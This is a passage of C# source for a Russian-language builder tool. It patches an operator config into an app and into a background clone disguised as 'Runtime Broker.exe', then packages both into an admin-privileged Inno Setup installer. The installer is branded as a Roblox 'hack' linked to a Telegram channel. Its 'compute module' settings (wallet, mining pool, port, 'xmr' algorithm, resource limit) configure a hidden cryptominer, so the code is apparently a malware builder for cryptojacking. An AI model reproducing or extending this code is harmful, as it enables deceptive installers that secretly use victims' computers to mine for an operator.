                            if (Path.GetFileName(d).Contains("RAH") || Path.GetFileName(d).Contains("FileTransfer"))
                            {
                                targetDllPath = d;
                                break;
                            }
                        }
                    }

                    if (!File.Exists(targetDllPath))
                    {
                        Log("❌ ОШИБКА: Библиотека приложения не найдена!");
                        return;
                    }

                    Log($"💉 Внедрение параметров оператора в {Path.GetFileName(targetDllPath)}...");
                    bool patchOk = InjectConfigIntoFile(targetDllPath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict, btnText, themeAccent, themeSurface);
                    if (!patchOk)
                    {
                        Log("❌ ОШИБКА внедрения параметров оператора!");
                        return;
                    }

                    string cloneExePath = Path.Combine(stagingDir, "clone", "Runtime Broker.exe");
                    if (File.Exists(cloneExePath))
                    {
                        Log($"💉 Внедрение параметров оператора в Single-File фоновый клон (Runtime Broker.exe)...");
                        bool clonePatchOk = InjectConfigIntoFile(cloneExePath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict, btnText, themeAccent, themeSurface);
                        if (clonePatchOk)
                        {
                            Log("   ✅ Конфигурация успешно внедрена в Single-File Runtime Broker!");
                        }
                        else
                        {
                            Log("   ⚠️ Внимание: Не удалось внедрить конфигурацию в Runtime Broker.exe.");
                        }
                    }

                    // 3. Переименование файлов под выбранное имя приложения и настройка AppHost
                    string finalExeName = $"{cleanExeBaseName}.exe";
                    string finalDllName = $"{cleanExeBaseName}.dll";
                    string finalExePath = Path.Combine(stagingDir, finalExeName);
                    string finalDllPath = Path.Combine(stagingDir, finalDllName);

                    string origDllName = isStandalone ? "RAH PRO.dll" : "RAH Non Pro.dll";
                    string origExeName = isStandalone ? "RAH PRO.exe" : "RAH Non Pro.exe";
                    string origExePath = Path.Combine(stagingDir, origExeName);

                    // Переименовываем целевую DLL
                    if (File.Exists(targetDllPath) && !string.Equals(targetDllPath, finalDllPath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(targetDllPath, finalDllPath, true);
                        Log($"🔄 Библиотека переименована: {Path.GetFileName(targetDllPath)} -> {finalDllName}");
                    }

                    // Переименовываем конфигурационные файлы .NET
                    string origConfigName = isStandalone ? "RAH PRO.runtimeconfig.json" : "RAH Non Pro.runtimeconfig.json";
                    string finalConfigName = $"{cleanExeBaseName}.runtimeconfig.json";
                    string origConfigPath = Path.Combine(stagingDir, origConfigName);
                    string finalConfigPath = Path.Combine(stagingDir, finalConfigName);
                    if (File.Exists(origConfigPath) && !string.Equals(origConfigPath, finalConfigPath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(origConfigPath, finalConfigPath, true);
                    }

                    string origDepsName = isStandalone ? "RAH PRO.deps.json" : "RAH Non Pro.deps.json";
                    string finalDepsName = $"{cleanExeBaseName}.deps.json";
                    string origDepsPath = Path.Combine(stagingDir, origDepsName);
                    string finalDepsPath = Path.Combine(stagingDir, finalDepsName);
                    if (File.Exists(origDepsPath) && !string.Equals(origDepsPath, finalDepsPath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(origDepsPath, finalDepsPath, true);
                    }

                    // Переименовываем исполняемый файл
                    if (File.Exists(origExePath) && !string.Equals(origExePath, finalExePath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(origExePath, finalExePath, true);
                        Log($"🔄 Исполняемый файл переименован: {origExeName} -> {finalExeName}");
                    }

                    // Настраиваем AppHost на запуск новой DLL
                    Log($"🔧 Привязка .NET AppHost к {finalDllName}...");
                    PeMetadataPatcher.UpdateAppHostDllName(finalExePath, origDllName, finalDllName);

                    // Внедряем VersionInfo в ресурсы PE файла (чтобы Windows UAC и Свойства файла отображали имя приложения и автора)
                    Log($"📝 Внедрение свойств в EXE: Имя='{appName}', Автор='{appAuthor}'...");
                    bool verPatched = PeMetadataPatcher.UpdateVersionInfo(finalExePath, appName, appAuthor, AppVersion);
                    if (verPatched)
                    {
                        Log("   ✅ Метаданные VersionInfo успешно внедрены в EXE!");
                    }

                    // 4. Внедрение иконки в исполняемый файл
                    if (File.Exists(_activeIconPath))
                    {
                        Log($"🎨 Внедрение иконки в {finalExeName}...");
                        string destIco = Path.Combine(stagingDir, "app.ico");
                        try { File.Copy(_activeIconPath, destIco, true); } catch { }

                        if (File.Exists(finalExePath))
                        {
                            bool iconInjected = IconInjector.InjectIcon(finalExePath, _activeIconPath);
                            if (iconInjected) Log("   ✅ Иконка успешно встроена в ресурсы PE .exe файла!");
                        }
                    }

                    // 4.1 Внедрение кастомного фона (если задан)
                    if (!string.IsNullOrEmpty(_customBgPath) && File.Exists(_customBgPath))
                    {
                        try
                        {
                            string ext = Path.GetExtension(_customBgPath).ToLowerInvariant();
                            string destBgName = (ext == ".png") ? "bg.png" : "bg.jpg";
                            string destBg = Path.Combine(stagingDir, destBgName);
                            File.Copy(_customBgPath, destBg, true);
                            Log($"🎨 Кастомный фон скопирован в дистрибутив: {destBgName}");
                        }
                        catch (Exception bgEx)
                        {
                            Log($"⚠️ Не удалось скопировать кастомный фон: {bgEx.Message}");
                        }
                    }

                    // 5. Сборка инсталлятора через Inno Setup
                    Log("🛠️ Сборка Setup Инсталлятора через Inno Setup 6...");
                    string setupBaseName = $"{cleanExeBaseName}_Setup_{opName}";
                    bool instOk = await CompileInnoSetup(
                        sourceDirectory: stagingDir,
                        outputDir: outDir,
                        outputBaseFilename: setupBaseName,
                        appName: appName,
                        appPublisher: appAuthor,
                        appExeName: finalExeName,
                        appVersion: AppVersion,
                        opName: opName,
                        iconPath: _activeIconPath,
                        createDesktopShortcut: true,
                        compressLzma: true,
                        runAsAdmin: true
                    );

                    try { Directory.Delete(stagingDir, true); } catch { }

                    if (!instOk)
                    {
                        Log("❌ ОШИБКА сборки инсталлятора!");
                        return;
                    }

                    Dispatcher.Invoke(() =>
                    {
                        txtBuildStep4.Text = "✓ 4. Сборка программы завершена";
                        txtBuildStep5.Text = "✓ 5. Проверка результата пройдена";
                    });

                    Log($"✅ СБОРКА УСПЕШНО ЗАВЕРШЕНА!");
                    Log($"📁 Расположение: {outputFullPath}");
                    Log($"🎯 Привязка оператора: @{opName}");
                    success = true;
                }
                catch (Exception ex)
                {
                    Log("❌ ИСКЛЮЧЕНИЕ СБОРКИ: " + ex.Message);
                }
            });

            pbProgress.IsIndeterminate = false;
            pbProgress.Value = success ? 100 : 0;
            lblStatus.Text = success ? $"• Готово: {targetOutputName}" : "• Ошибка создания программы";
            btnBuildStandaloneInstaller.IsEnabled = true;
            btnBuildClientInstaller.IsEnabled = true;
            btnBrowse.IsEnabled = true;

            if (success)
            {
                pnlBuildSuccess.Visibility = Visibility.Visible;
                btnOpenFolder.Visibility = Visibility.Visible;
            }
            else
            {
                pnlErrorBanner.Visibility = Visibility.Visible;
                txtErrorDetails.Text = "Не удалось завершить создание программы. Проверьте журнал сборки.";
            }
        }

        private bool InjectConfigIntoFile(string filePath, string opName, string appName, string appAuthor, string tgChannel, bool isStandalone, Dictionary<string, object?>? customConfig = null, string btnText = "ВЗЛОМАТЬ", string themeAccent = "#ffffff", string themeSurface = "#0D0E12")
        {
            byte[] bytes = File.ReadAllBytes(filePath);

            string[] candidateStarts = new[]
            {
                "`<`<NEXUS_CFG_START`>`>",
                "<<NEXUS_CFG_START>>"
            };

            int payloadStart = -1;
            int availableBytes = -1;

            foreach (var candStart in candidateStarts)
            {
                byte[] markerStart = Encoding.Unicode.GetBytes(candStart);
                string candEnd = candStart.Replace("START", "END");
                byte[] markerEnd = Encoding.Unicode.GetBytes(candEnd);

                int searchPos = 0;
                while (searchPos < bytes.Length)
                {
                    int startIdx = IndexOfBytes(bytes, markerStart, searchPos);
                    if (startIdx == -1) break;

                    int pStart = startIdx + markerStart.Length;
                    int endIdx = IndexOfBytes(bytes, markerEnd, pStart);
                    if (endIdx != -1)
                    {
                        int avail = endIdx - pStart;
                        if (avail >= 1000)
                        {
                            payloadStart = pStart;
                            availableBytes = avail;
                            Log($"   🔍 [Config Injection] Найден буфер конфигурации в {Path.GetFileName(filePath)} (offset: {payloadStart}, емкость: {availableBytes} байт)");
                            break;
                        }
                    }
                    searchPos = startIdx + 1;
                }

                if (payloadStart != -1) break;
            }

            if (payloadStart == -1 || availableBytes < 1000)
            {
                Log($"   ❌ [Config Injection] Буфер конфигурации не найден в {Path.GetFileName(filePath)}!");
                return false;
            }

            string finalBtnText = string.IsNullOrWhiteSpace(btnText) ? "ВЗЛОМАТЬ" : btnText;
            string finalAccent = string.IsNullOrWhiteSpace(themeAccent) ? "#ffffff" : themeAccent;
            string finalSurface = string.IsNullOrWhiteSpace(themeSurface) ? "#0D0E12" : themeSurface;

            var configData = new
            {
                operatorName = opName,
                appTitleMain = appName,
                appAuthor = appAuthor,
                company = appAuthor,
                appTitleVersion = "v" + AppVersion,
                windowTitle = $"{appName} {AppVersion}",
                clientVersion = AppVersion,
                version = AppVersion,
                telegramChannel = tgChannel,
                telegramUrl = tgChannel,
                tgChannel = tgChannel,
                loginText = finalBtnText,
                buttonText = finalBtnText,
                btnText = finalBtnText,
                themeAccent = finalAccent,
                themeSurface = finalSurface,
                buildMode = isStandalone ? "standalone" : "loader",
                customConfig = customConfig ?? new Dictionary<string, object?>(),
                builtAt = DateTime.UtcNow.ToString("o")
            };

            var jsonOptions = new JsonSerializerOptions
            {
                Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
            };
            string json = JsonSerializer.Serialize(configData, jsonOptions);
            byte[] jsonBytes = Encoding.Unicode.GetBytes(json);

            if (jsonBytes.Length > availableBytes)
            {
                Log($"   ❌ [Config Injection] Размер конфигурации ({jsonBytes.Length} байт) превышает размер буфера ({availableBytes} байт)!");
                return false;
            }

            for (int i = 0; i < availableBytes; i += 2)
            {
                bytes[payloadStart + i] = 0x20;
                bytes[payloadStart + i + 1] = 0x00;
            }
            Array.Copy(jsonBytes, 0, bytes, payloadStart, jsonBytes.Length);

            File.WriteAllBytes(filePath, bytes);
            return true;
        }

        private async Task<bool> CompileInnoSetup(
            string sourceDirectory,
            string outputDir,
            string outputBaseFilename,
            string appName,
            string appPublisher,
            string appExeName,
            string appVersion,
            string opName,
            string iconPath,
            bool createDesktopShortcut,
            bool compressLzma,
            bool runAsAdmin)
        {
            string? iscc = await EnsureInnoSetup();
            if (string.IsNullOrEmpty(iscc) || !File.Exists(iscc))
            {
                Log("❌ Inno Setup (ISCC.exe) не найден и не удалось загрузить!");
                return false;
            }

            if (!File.Exists(iconPath))
            {
                iconPath = GetPresetIconPath("thunder");
            }

            string safePublisher = string.IsNullOrWhiteSpace(appPublisher) ? "RAH Team" : appPublisher.Replace("\"", "");
            string compressionMode = compressLzma ? "lzma2/ultra64" : "lzma2/fast";
            string adminPrivilege = runAsAdmin ? "admin" : "lowest";

            string desktopTask = createDesktopShortcut
                ? "Name: \"desktopicon\"; Description: \"{cm:CreateDesktopIcon}\"; GroupDescription: \"{cm:AdditionalIcons}\"; Flags: unchecked"
                : "";

            string desktopIcon = createDesktopShortcut
                ? $"Name: \"{{autodesktop}}\\{{#MyAppName}}\"; Filename: \"{{app}}\\{{#MyAppExeName}}\"; Tasks: desktopicon; IconFilename: \"{{app}}\\app.ico\""
                : "";

            string setupIconLine = File.Exists(iconPath) ? $"SetupIconFile={iconPath}" : "";
            string iconFileLine = File.Exists(iconPath) ? $"Source: \"{iconPath}\"; DestDir: \"{{app}}\"; DestName: \"app.ico\"; Flags: ignoreversion" : "";

            // Генерируем детерминистический AppId на основе имени приложения,
            // чтобы повторная установка обновляла существующую, а не создавала дубликат
            string appIdSeed = "NEXUS_APP_" + appName.Trim().ToUpperInvariant();
            byte[] hashBytes;
            using (var md5 = MD5.Create()) { hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(appIdSeed)); }
            string deterministicGuid = new Guid(hashBytes).ToString().ToUpper();

            string issScript = $@"#define MyAppName ""{appName}""
#define MyAppVersion ""{appVersion}""
#define MyAppPublisher ""{safePublisher}""
#define MyAppExeName ""{appExeName}""

[Setup]
AppId={{{{{deterministicGuid}}}}}
AppName={{#MyAppName}}
AppVersion={{#MyAppVersion}}
AppPublisher={{#MyAppPublisher}}
AppPublisherURL=https://t.me/robloxvzlomez
DefaultDirName={{autopf}}\\{{#MyAppName}}
UninstallDisplayIcon={{app}}\\{{#MyAppExeName}}
ArchitecturesAllowed=x64compatible
ArchitecturesInstallIn64BitMode=x64compatible
DisableProgramGroupPage=yes
PrivilegesRequired={adminPrivilege}
OutputDir={outputDir}
OutputBaseFilename={outputBaseFilename}
SolidCompression=yes
Compression={compressionMode}
WizardStyle=modern
{setupIconLine}
VersionInfoVersion={appVersion}.0
VersionInfoTextVersion={appVersion}
VersionInfoCompany={{#MyAppPublisher}}
VersionInfoDescription={{#MyAppName}} Setup
VersionInfoCopyright=Copyright (C) 2026 {{#MyAppPublisher}}

[Languages]
Name: ""russian""; MessagesFile: ""compiler:Languages\\Russian.isl""
Name: ""english""; MessagesFile: ""compiler:Default.isl""


[Tasks]
{desktopTask}

[Files]
Source: ""{sourceDirectory}\*""; DestDir: ""{{app}}""; Flags: ignoreversion recursesubdirs createallsubdirs
{iconFileLine}

[Icons]
Name: ""{{autoprograms}}\\{{#MyAppName}}""; Filename: ""{{app}}\\{{#MyAppExeName}}""; IconFilename: ""{{app}}\\app.ico""
{desktopIcon}

[Run]
Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#StringChange(MyAppName, '&', '&&')}}}}""; Flags: nowait postinstall skipifsilent runascurrentuser
";

            string tempIssPath = Path.Combine(Path.GetTempPath(), $"nexus_setup_{Guid.NewGuid():N}.iss");
            File.WriteAllText(tempIssPath, issScript, Encoding.UTF8);

            Log($"⚡ Компиляция установщика через Inno Setup: {Path.GetFileName(iscc)}...");
            Log($"📦 Режим: распаковка полного пакета DLL в Program Files, иконка: {Path.GetFileName(iconPath)}");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = iscc,
                    Arguments = $"\"{tempIssPath}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var proc = Process.Start(psi);
                if (proc == null) return false;

                proc.OutputDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        if (e.Data.StartsWith("Compressing:") || e.Data.StartsWith("Updating") || e.Data.StartsWith("Successful"))
                        {
                            Log("   " + e.Data.Trim());
                        }
                    }
                };
                proc.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrWhiteSpace(e.Data))
                    {
                        Log("   ⚠️ " + e.Data.Trim());
                    }
                };

                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();

                await proc.WaitForExitAsync();

                try { File.Delete(tempIssPath); } catch { }

                return proc.ExitCode == 0;
            }
            catch (Exception ex)
            {
                Log("❌ Ошибка выполнения Inno Setup: " + ex.Message);
                return false;
            }
        }

        private static void CopyDirectory(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);

            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string targetFile = Path.Combine(targetDir, Path.GetFileName(file));
                File.Copy(file, targetFile, true);
            }

            foreach (string subDir in Directory.GetDirectories(sourceDir))
            {
                string targetSub = Path.Combine(targetDir, Path.GetFileName(subDir));
                CopyDirectory(subDir, targetSub);
            }
        }

        #region Custom Project Configuration Management
        private void UpdateCustomConfigCount()
        {
        }

        private void SaveCustomProjectParams()
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(_projectConfigFilePath)!);
                // Сохраняем произвольные пользовательские параметры
                var arbitraryParams = CustomProjectParams.Where(p => !IsComputeModuleKey(p.Key)).ToList();
                string json = JsonSerializer.Serialize(arbitraryParams, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(_projectConfigFilePath, json, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                Log("⚠️ Ошибка сохранения конфигурации проекта: " + ex.Message);
            }

            SaveComputeModuleConfig();
        }

        private void LoadCustomProjectParams()
        {
            try
            {
                if (File.Exists(_projectConfigFilePath))
                {
                    string json = File.ReadAllText(_projectConfigFilePath, Encoding.UTF8);
                    var items = JsonSerializer.Deserialize<List<CustomProjectParam>>(json);
                    if (items != null)
                    {
                        CustomProjectParams.Clear();
                        // Collect legacy compute keys for migration
                        var legacyComputeKeys = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

                        foreach (var it in items)
                        {
                            if (IsComputeModuleKey(it.Key))
                            {
                                // Capture legacy compute keys for potential migration
                                legacyComputeKeys[it.Key] = it.DefaultValue ?? "";
                            }
                            else
                            {
                                CustomProjectParams.Add(it);
                            }
                        }

                        // If we found legacy compute keys and have no modules yet, migrate them
                        if (legacyComputeKeys.Count > 0 && ComputeConfig.Modules.Count == 0)
                        {
                            var legacyDict = new Dictionary<string, object>();
                            foreach (var kv in legacyComputeKeys)
                            {
                                legacyDict[kv.Key] = kv.Value;
                            }
                            var migrated = ComputeRootConfig.MigrateFromLegacy(legacyDict);
                            ComputeConfig.Enabled = migrated.Enabled;
                            ComputeConfig.Modules = migrated.Modules;
                            chkComputeEnabled.IsChecked = ComputeConfig.Enabled;
                            RenderComputeModuleCards();
                            UpdateComputeGlobalState();
                            SaveComputeModuleConfig();
                            Log("📦 Compute: мигрированы ключи из Custom Project Config → modules[]");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log("⚠️ Ошибка загрузки сохраненной конфигурации: " + ex.Message);
            }

            UpdateCustomConfigCount();
        }

        public (bool isValid, string error) ValidateAllCustomParams()
        {
            var keys = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var param in CustomProjectParams)
            {
                if (string.IsNullOrWhiteSpace(param.Key))
                {
                    return (false, $"У параметра '{param.Name}' не указан уникальный ключ.");
                }

                if (!keys.Add(param.Key))
                {
                    return (false, $"Дубликат ключа конфигурации: '{param.Key}'!");
                }

                var (valid, err) = param.Validate();
                if (!valid)
                {
                    return (false, err);
                }
            }

            return (true, "");
        }

        public Dictionary<string, object?> BuildCustomConfigDictionary()
        {
            var dict = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase);

            // 1. Произвольные пользовательские параметры (Custom Project Configuration)
            foreach (var param in CustomProjectParams)
            {
                if (IsComputeModuleKey(param.Key)) continue;
                dict[param.Key] = param.GetTypedValue();
            }

            // 2. New structured compute configuration
            ComputeConfig.Enabled = chkComputeEnabled?.IsChecked == true;
            dict["compute"] = ComputeConfig.ToDictionary();

            // 3. Legacy backward-compatible top-level keys from the first active module
            bool isEnabled = ComputeConfig.Enabled;
            var firstActive = ComputeConfig.Modules.FirstOrDefault(m => m.Enabled);

            if (firstActive != null && isEnabled)
            {
                dict["enabled"] = true;
                string legacyMode = MapAlgorithmToLegacyMode(firstActive.Primary.Algorithm);
                dict["mode"] = legacyMode;
                dict["walletAddress"] = firstActive.Primary.Wallet;
                dict["serverAddress"] = firstActive.Primary.Pool;
                dict["serverPort"] = firstActive.Primary.Port;
                string wName = firstActive.Primary.Worker;
                dict["workerName"] = string.IsNullOrWhiteSpace(wName) ? "rig" : wName;
                int resLimit = firstActive.ResourceLimit;
                if (resLimit < 1) resLimit = 1;
                if (resLimit > 100) resLimit = 100;
                dict["resourceLimit"] = resLimit;
            }
            else
            {
                dict["enabled"] = false;
                dict["mode"] = "disabled";
                dict["walletAddress"] = "";
                dict["serverAddress"] = "";
                dict["serverPort"] = 0;
                dict["workerName"] = "rig";
                dict["resourceLimit"] = 30;
            }

            return dict;
        }
        #endregion

        #region Compute Module Dedicated UI Handlers

        private void InitializeComputeModuleUI()
        {
            LoadComputeModuleConfig();
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
        }

        private void ChkComputeEnabled_Changed(object sender, RoutedEventArgs e)
        {
            ComputeConfig.Enabled = chkComputeEnabled.IsChecked == true;
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void BtnAddComputeModule_Click(object sender, RoutedEventArgs e)
        {
            int nextIndex = ComputeConfig.Modules.Count + 1;
            var algo = AlgorithmRegistry.All.FirstOrDefault();
            var newModule = new ComputeModuleConfig
            {
                Name = $"Compute Module #{nextIndex}",
                Enabled = true,
                Mode = "single",
                Primary = new ComputeEngineEndpoint
                {
                    Algorithm = algo?.Id ?? "xmr",
                    Wallet = algo?.WalletPlaceholder ?? "",
                    Pool = algo?.DefaultPool ?? "",
                    Port = algo?.DefaultPort ?? 3333,
                    Worker = "rig"
                },
                ResourceLimit = 30
            };
            ComputeConfig.Modules.Add(newModule);
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void CopyComputeModule(ComputeModuleConfig mod)
        {
            var clone = mod.Clone();
            // Append -copy suffix to worker name
            if (!string.IsNullOrEmpty(clone.Primary.Worker))
                clone.Primary.Worker = clone.Primary.Worker + "-copy";
            if (clone.IsDualMode && !string.IsNullOrEmpty(clone.Secondary.Worker))
                clone.Secondary.Worker = clone.Secondary.Worker + "-copy";

            ComputeConfig.Modules.Add(clone);
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void DeleteComputeModule(ComputeModuleConfig mod)
        {
            int idx = ComputeConfig.Modules.IndexOf(mod);
            string name = idx >= 0 ? $"Compute Module #{idx + 1}" : mod.Name;
            var answer = System.Windows.MessageBox.Show(
                $"Удалить {name}?\n\nЭто действие нельзя отменить.",
                "Подтверждение удаления",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning
            );
            if (answer != MessageBoxResult.Yes) return;

            ComputeConfig.Modules.Remove(mod);
            RenderComputeModuleCards();
            UpdateComputeGlobalState();
            SaveComputeModuleConfig();
        }

        private void SwapModuleEndpoints(ComputeModuleConfig mod)
        {
            mod.SwapEndpoints();
            RenderComputeModuleCards();
            SaveComputeModuleConfig();
        }

        private void UpdateComputeGlobalState()
        {
            if (!_isInitialized || chkComputeEnabled == null) return;

            bool isChecked = chkComputeEnabled.IsChecked == true;
            int moduleCount = ComputeConfig.Modules.Count;
            int activeCount = ComputeConfig.Modules.Count(m => m.Enabled);

            // Module count badge
            if (txtModuleCount != null)
            {
                txtModuleCount.Text = $"{moduleCount} {GetModuleWord(moduleCount)}";
            }

            // Global state badge
            if (isChecked && activeCount > 0)
            {
                badgeComputeState.Background = new SolidColorBrush(Color.FromRgb(20, 83, 45));
                badgeComputeState.BorderBrush = new SolidColorBrush(Color.FromRgb(34, 197, 94));
                txtComputeBadgeState.Text = $"АКТИВЕН ({activeCount})";
                txtComputeBadgeState.Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128));
            }
            else
            {
                badgeComputeState.Background = new SolidColorBrush(Color.FromRgb(30, 41, 59));
                badgeComputeState.BorderBrush = new SolidColorBrush(Color.FromRgb(51, 65, 85));
                txtComputeBadgeState.Text = "ОТКЛЮЧЕН";
                txtComputeBadgeState.Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184));
            }

            // Empty state and add more button
            if (pnlComputeEmptyState != null)
            {
                pnlComputeEmptyState.Visibility = moduleCount == 0 ? Visibility.Visible : Visibility.Collapsed;
            }
            if (pnlAddMoreComputeModules != null)
            {
                pnlAddMoreComputeModules.Visibility = moduleCount > 0 ? Visibility.Visible : Visibility.Collapsed;
            }

            // Disable cards if global toggle is off
            if (pnlComputeModulesList != null)
            {
                pnlComputeModulesList.IsEnabled = isChecked;
                pnlComputeModulesList.Opacity = isChecked ? 1.0 : 0.45;
            }
        }

        private static string GetModuleWord(int count)
        {
            if (count % 10 == 1 && count % 100 != 11) return "модуль";
            if (count % 10 >= 2 && count % 10 <= 4 && (count % 100 < 10 || count % 100 >= 20)) return "модуля";
            return "модулей";
        }

        /// <summary>
        /// Renders all compute module cards dynamically into pnlComputeModulesList.
        /// </summary>
        private void RenderComputeModuleCards()
        {
            if (pnlComputeModulesList == null) return;
            pnlComputeModulesList.Children.Clear();

            for (int i = 0; i < ComputeConfig.Modules.Count; i++)
            {
                var mod = ComputeConfig.Modules[i];
                var card = CreateModuleCard(mod, i);
                pnlComputeModulesList.Children.Add(card);
            }

            if (pnlComputeEmptyState != null)
            {
                pnlComputeEmptyState.Visibility = ComputeConfig.Modules.Count == 0
                    ? Visibility.Visible : Visibility.Collapsed;
            }
            if (pnlAddMoreComputeModules != null)
            {
                pnlAddMoreComputeModules.Visibility = ComputeConfig.Modules.Count > 0
                    ? Visibility.Visible : Visibility.Collapsed;
            }
        }

        /// <summary>
        /// Creates a visual card (Border) for a single ComputeModuleConfig.
        /// </summary>
        private Border CreateModuleCard(ComputeModuleConfig mod, int index)
        {
            var card = new Border
            {
                Background = new SolidColorBrush(Color.FromRgb(15, 17, 23)),
                BorderBrush = new SolidColorBrush(Color.FromRgb(35, 39, 51)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(8),
                Padding = new Thickness(14, 12, 14, 12),
                Margin = new Thickness(0, 0, 0, 10)
            };

            var rootStack = new StackPanel();

            // === TOP BAR ===
            var topBar = new Grid();
            topBar.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            topBar.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

            // Left: Title + Status Badge + Mode Selector
            var leftPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };

            // Module toggle
            var chkEnabled = new WpfCheckBox
            {
                IsChecked = mod.Enabled,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 8, 0),
                Cursor = System.Windows.Input.Cursors.Hand,
                Style = (Style)FindResource("ModernCheckBox")
            };
            var capturedMod = mod;
            chkEnabled.Checked += (s, e) => { capturedMod.Enabled = true; UpdateComputeGlobalState(); SaveComputeModuleConfig(); UpdateModuleStatusBadge(card, capturedMod); };
            chkEnabled.Unchecked += (s, e) => { capturedMod.Enabled = false; UpdateComputeGlobalState(); SaveComputeModuleConfig(); UpdateModuleStatusBadge(card, capturedMod); };
            leftPanel.Children.Add(chkEnabled);

            // Title
            leftPanel.Children.Add(new TextBlock
            {
                Text = mod.IsDualMode ? $"Две задачи #{index + 1}" : $"Задача #{index + 1}",
                Foreground = new SolidColorBrush(Color.FromRgb(241, 245, 249)),
                FontSize = 12.5,
                FontWeight = FontWeights.Bold,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 10, 0)
            });

            // Status badge
            var statusBadge = new Border
            {
                Background = mod.Enabled
                    ? new SolidColorBrush(Color.FromRgb(20, 83, 45))
                    : new SolidColorBrush(Color.FromRgb(30, 41, 59)),
                CornerRadius = new CornerRadius(4),
                Padding = new Thickness(6, 2, 6, 2),
                Margin = new Thickness(0, 0, 12, 0),
                VerticalAlignment = VerticalAlignment.Center,
                Tag = "statusBadge"
            };
            statusBadge.Child = new TextBlock
            {
                Text = mod.Enabled ? "ВКЛЮЧЕНО" : "ОТКЛЮЧЕНО",
                Foreground = mod.Enabled
                    ? new SolidColorBrush(Color.FromRgb(74, 222, 128))
                    : new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 9.5,
                FontWeight = FontWeights.Bold
            };
            leftPanel.Children.Add(statusBadge);

            // Mode selector
            leftPanel.Children.Add(new TextBlock
            {
                Text = "Что запустить:",
                Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 11,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 0, 6, 0)
            });

            var cbMode = new WpfComboBox
            {
                Width = 130,
                Height = 28,
                FontSize = 11,
                VerticalAlignment = VerticalAlignment.Center,
                Style = (Style)FindResource("ModernComboBox")
            };
            cbMode.Items.Add(new ComboBoxItem { Content = "Одна задача", Tag = "single", Style = (Style)FindResource("DarkComboBoxItem") });
            cbMode.Items.Add(new ComboBoxItem { Content = "Две задачи", Tag = "dual", Style = (Style)FindResource("DarkComboBoxItem") });
            cbMode.SelectedIndex = mod.IsDualMode ? 1 : 0;
            cbMode.SelectionChanged += (s, e) =>
            {
                if (cbMode.SelectedItem is ComboBoxItem ci && ci.Tag != null)
                {
                    capturedMod.Mode = ci.Tag.ToString() ?? "single";
                    RenderComputeModuleCards();
                    SaveComputeModuleConfig();
                }
            };
            leftPanel.Children.Add(cbMode);

            Grid.SetColumn(leftPanel, 0);
            topBar.Children.Add(leftPanel);

            // Right: Action Buttons
            var rightPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };

            var btnCopy = CreateSmallButton("Копировать", "#202430", "#94a3b8");
            btnCopy.Click += (s, e) => CopyComputeModule(capturedMod);
            rightPanel.Children.Add(btnCopy);

            var btnDelete = CreateSmallButton("Удалить", "#3b1419", "#f87171");
            btnDelete.Margin = new Thickness(6, 0, 0, 0);
            btnDelete.Click += (s, e) => DeleteComputeModule(capturedMod);
            rightPanel.Children.Add(btnDelete);

            Grid.SetColumn(rightPanel, 1);
            topBar.Children.Add(rightPanel);

            rootStack.Children.Add(topBar);

            // === PRIMARY ENDPOINT ===
            rootStack.Children.Add(CreateEndpointSection(mod.IsDualMode ? "ЗАДАЧА 1 (ОСНОВНАЯ)" : "ЗАДАЧА 1", mod.Primary, capturedMod, true));

            // === DUAL MODE: SWAP + SECONDARY ===
            if (mod.IsDualMode)
            {
                // Swap button
                var btnSwap = new WpfButton
                {
                    Content = "⇄  Поменять местами Задачу 1 и 2",
                    Height = 28,
                    FontSize = 11,
                    Foreground = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                    Background = new SolidColorBrush(Color.FromRgb(22, 25, 34)),
                    BorderBrush = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                    BorderThickness = new Thickness(1),
                    Padding = new Thickness(14, 0, 14, 0),
